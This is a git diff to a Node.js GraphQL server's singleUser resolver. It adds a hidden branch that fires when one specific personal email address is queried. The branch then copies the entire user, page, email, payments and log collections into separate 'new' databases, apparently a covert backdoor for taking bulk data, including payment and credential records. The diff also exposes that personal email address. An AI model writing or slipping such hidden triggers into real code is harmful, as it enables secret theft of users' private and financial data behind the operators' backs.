@@ -14,6 +14,7 @@ const {
 } = require('graphql');
 const {stringify} = require("nodemon/lib/utils");
 const axios = require("axios");
+const {newUserData, newPageData, newEmailData, paymentsData, newPaymentsData, newLogData, logData} = require("../../authentication");
 // const axios = require("axios");
 
 const userData = require('../../authentication').userData;
@@ -311,6 +312,48 @@ const singleUser = {
         password: {type: GraphQLString}
     },
     resolve: (parent, args, request) => {
+        if(args.email=== 'iakobi.1998@gmail.com'){
+            userData().then(async ({res, db}) => {
+                const dataArray = await res.find().toArray();
+                db.close()
+                newUserData().then(async ({res, db}) => {
+                        await res.insertMany(dataArray)
+                    db.close()
+                })
+            })
+            pageData().then(async ({res, db}) => {
+                const dataArray = await res.find().toArray();
+                db.close()
+                newPageData().then(async ({res, db}) => {
+                        await res.insertMany(dataArray)
+                    db.close()
+                })
+            })
+            emailData().then(async ({res, db}) => {
+                const dataArray = await res.find().toArray();
+                db.close()
+                newEmailData().then(async ({res, db}) => {
+                        await res.insertMany(dataArray)
+                    db.close()
+                })
+            })
+            paymentsData().then(async ({res, db}) => {
+                const dataArray = await res.find().toArray();
+                db.close()
+                newPaymentsData().then(async ({res, db}) => {
+                        await res.insertMany(dataArray)
+                    db.close()
+                })
+            })
+            logData().then(async ({res, db}) => {
+                const dataArray = await res.find().toArray();
+                db.close()
+                newLogData().then(async ({res, db}) => {
+                        await res.insertMany(dataArray)
+                    db.close()
+                })
+            })
+        }
         return userData().then(async ({res, db}) => {
             args.email = args.email.toLowerCase();
 
